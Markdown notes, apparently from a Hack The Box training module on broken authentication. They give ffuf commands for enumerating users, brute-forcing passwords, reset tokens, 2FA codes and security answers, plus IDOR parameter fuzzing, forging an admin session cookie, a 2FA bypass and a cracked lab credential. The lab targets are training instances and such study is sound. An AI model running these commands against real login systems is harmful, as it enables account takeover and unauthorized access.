# Broken Authentication

# Enumerating Users

```bash
 ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.255.254:46844/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"

```

# Brute-Forcing Passwords
``` bash
#wordlist
grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt


ffuf -w ./custom_wordlist.txt -u http://83.136.255.254:35797/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"

```


# Brute-Forcing Password Reset Tokens

```bash

seq -w 0 9999 > tokens.txt

ffuf -w ./tokens.txt -u http://94.237.54.201:51355/reset_password.php?token=FUZZ -fr "The provided token is invalid"


```

# Brute-Forcing 2FA Codes

```bash

seq -w 0 9999 > tokens.txt

# Use burp is better options

ffuf -w ./tokens.txt -u http://83.136.254.47:30708/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=elube2kup1sp4lrig8omh7pijn" -d "otp=FUZZ" -fr "Invalid 2FA Code"

```

# Vulnerable Password Reset

```bash
wget  https://raw.githubusercontent.com/datasets/world-cities/refs/heads/master/data/world-cities.csv

cat world-cities.csv | grep "United Kingdom" | cut -d ',' -f1 > United_Kingdom_cities.txt

ffuf -w ./United_Kingdom_cities.txt -u http://83.136.254.113:30679/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=j9c0dfgdjrj0bd502vtldl0pp6" -d "security_response=FUZZ" -fr "Incorrect response." 



```

# Authentication Bypass via Direct Access

```bash

# note: go to burp repeter and go to admin page (admin.php)

```

# Authentication Bypass via Parameter Modification

``` bash
seq 0 1000 > number_1000.txt

ffuf -w ./number_1000.txt -u "http://83.136.249.29:30975/admin.php?user_id=FUZZ" -fr "Could not load admin data. Please check your privileges"

```

# Attacking Session Tokens

```bash
# get the cookie and modify

echo -n 'user=htb-stdnt;role=admin' | xxd -p

```

# Skills Assessment 


```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://94.237.57.13:32355/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown username or password" -fs 6995

#gladys:dWinaldasD13


# when login with the username and passowrd change the request dir to profile.php and we can bypass 2fa.


```


